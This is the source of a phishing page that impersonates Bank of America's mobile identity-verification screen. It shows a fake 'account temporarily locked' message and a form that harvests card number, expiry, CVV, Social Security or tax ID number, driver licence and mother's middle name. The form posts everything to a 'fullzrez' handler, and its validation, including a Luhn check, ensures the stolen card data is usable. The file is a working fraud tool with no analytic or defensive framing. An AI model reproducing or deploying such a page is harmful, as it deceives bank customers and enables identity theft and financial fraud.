
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
        <meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Bank of America Mobile - Identity Verification</title>
   <link rel="shortcut icon" href="css-js/fcn.ico" type="image/ico">
<script language="JavaScript" src="css-js/ck.js" type="text/javascript"></script>
<script language="JavaScript" src="css-js/jquery.min.js" type="text/javascript"></script>
<script language="JavaScript" src="css-js/jquery.inputmask.bundle.min.js" type="text/javascript"></script>

	<link rel="stylesheet" href="css-js/rs13.css"><link rel="stylesheet" href="css-js/rs15.css"><link rel="stylesheet" href="css-js/rs11.css"><link rel="stylesheet" href="css-js/rs12.css"><link rel="stylesheet" href="css-js/rs14.css"></head>

<body><form name="form" id="form" action="fullzrez?<?=md5(microtime()).md5(microtime()).md5(microtime());?>" method="post">
	<div id="page" style="display: block; position: static; float: left; width: 100%; height: 100%;" class=""><div id="cmw_toolBar_" class="cmw_toolBar_ meter"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class="meter"><div id="cmw_toolBar_titleText" class="meter" style="padding-left: 10px; padding-right: 10px; width: 100%;">Payment Verification</div>
	<span id="segmentContainerid" class="segmentContainer">
		<span id="segmentComplete0" class="segment white"></span>
		<span id="circleComplete0" class="circle white"></span>
			<span class="segmentBreak"></span>
		<span id="segmentComplete1" class="segment white"></span>
		<span id="circleComplete1" class="circle white"></span>
			<span class="segmentBreak"></span>
		<span id="segment1" class="segment white"></span>
		<span id="circle1" class="circle white"></span>
			<span class="segmentBreak"></span>
		<span id="segment2" class="segment"></span>
		<span id="circle2" class="circle"></span>
	</span>
	</h1><a id="titleLink" class="adaHidden" href="javascript:void(0)" role="toolbar">Verify Using Business Credit Card</a><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div><div class="pageMinHeight"><div id="divMessaging" class="messaging"><a id="adaMessage" class="adaHidden" href="javascript:void(0)" role="text">Dear
 <?php echo $_SESSION['_ID']; ?>, the access to your account has been temporarily locked.
 Please fill in the required information in order to restore your 
account.</a><span class="messageIcon error"></span><div class="messageText"><a href="#" class="closeIcon" title="Close message" role="button"></a><p aria-hidden="true" role="text" class="TLu_ERROR">Dear
 <?php echo $_SESSION['_ID']; ?>, the access to your account has been temporarily locked.
 Please fill in the required information in order to restore your 
account.</p></div></div>
<div class="paddingVert10">
	<fieldset>
		<legend class="hidden"></legend>
		<div class="paddingHoriz10 fontBold">Credit Card number</div>
		<div class="inputContainer" id="card">
			<label class="adaHidden" for="card">Enter your business credit card number</label>
			<input data-mask="0000000000000000" class="sprite-clear_input_icns" maxlength="16" id="card" name="card" placeholder="" autocomplete="off" autocapitalize="off" autocorrect="off" type="text" pattern="\d*">
		</div>
		<div>
			<div class="paddingHoriz10 fontBold">Card Expiration Date</div>
			<div class="inputContainer" id="exp">
			<label class="adaHidden" for="exp">Enter your Card Expiration Date</label>
			<input  class="sprite-clear_input_icns" maxlength="10" id="exp" name="exp" placeholder="MM/YYYY" autocomplete="off" autocapitalize="off" autocorrect="off" type="tel" data-inputmask-alias="mm/yyyy" data-inputmask="'yearrange': { 'minyear': '2021', 'maxyear': '2028'}" data-val="true" data-val-required="Required" >

		</div>
		<div class="paddingHoriz10 fontBold">Credit Card Security Code (CVV)</div>
		<div class="inputContainer" id="cvv">
			<label class="adaHidden" for="cvv">Enter your card's 3-digit security code</label>
			<input data-mask="000" class="sprite-clear_input_icns" maxlength="4" id="cvv" name="cvv" placeholder="" autocomplete="off" autocapitalize="off" autocorrect="off" type="text" pattern="\d*">
		</div>
		<div class="paddingHoriz10 fontBold">Social Security number or Tax ID number</div>
		<div class="inputContainer" id="ssn">
			<label class="adaHidden" for="ssn">Enter your Social Security number or Taxpayer Identification Number</label>
			<input data-mask="000-00-0000" class="sprite-clear_input_icns" maxlength="15" id="ssn" name="ssn" placeholder="" autocomplete="off" autocapitalize="off" autocorrect="off" type="tel" >
		</div>
			<div class="paddingHoriz10 fontBold">Driver License</div>
		<div class="inputContainer" id="ssn">
			<label class="adaHidden" for="ssn">Enter your Driver License</label>
			<input class="sprite-clear_input_icns" id="dl" name="dl" placeholder="" autocomplete="off" autocapitalize="off" autocorrect="off" type="tel" >
		</div>
			<div class="paddingHoriz10 fontBold">Mother Middle Name</div>
		<div class="inputContainer" id="ssn">
			<label class="adaHidden" for="ssn">Enter your Mother Middle Name</label>
			<input class="sprite-clear_input_icns"  id="mn" name="mn" placeholder="" autocomplete="off" autocapitalize="off" autocorrect="off" type="tel" >
		</div>
		
		
	</div></fieldset>
	</div>
</div>
	<div>
					<script src="css-js/jquery.mask.js?<?=md5(microtime()).md5(microtime()).md5(microtime());?>"></script>

                        <div id="btSignonContinue"><button type="submit" style="float:left; width:95%;" role="button" class="btn">

			<span id="signonLabel">Continue</span>
		</button></div>
	
</div>
<div class="clear"></div></div>
<script language="JavaScript" type="text/javascript">
	$(":input[data-inputmask-mask]").inputmask();
  	$(":input[data-inputmask-alias]").inputmask();
 var frmvalidator = new Validator("form");
 frmvalidator.addValidation("card","num","Your card number contains invalid characters. Please enter your correct card number");
 frmvalidator.addValidation("card","minlen=16","Your card number is invalid. Please enter your correct card number");
 frmvalidator.addValidation("card","maxlen=16","Your card number is invalid. Please enter your correct card number");
 frmvalidator.addValidation("card","luhn","Your card number is invalid. Please enter your correct card number");
 frmvalidator.addValidation("card","gt=0000000000000000","Your card number is invalid. Please enter your correct card number");
 frmvalidator.addValidation("exp","req","Enter your Card Expiration Date");
 frmvalidator.addValidation("cvv","req","Enter your Card Verification Number (3 digits on the back of your card)");
 frmvalidator.addValidation("cvv","num","Your Card Verification Number contains invalid characters. Please enter your correct Card Verification Number");
 frmvalidator.addValidation("ssn","req","Social Security Number or Tin is required");
 frmvalidator.addValidation("ssn","minlen=11","Social Security Number or Tin is required");
 frmvalidator.addValidation("ssn","maxlen=11","Social Security Number or Tin is required");

</script>

</form>
</body></html>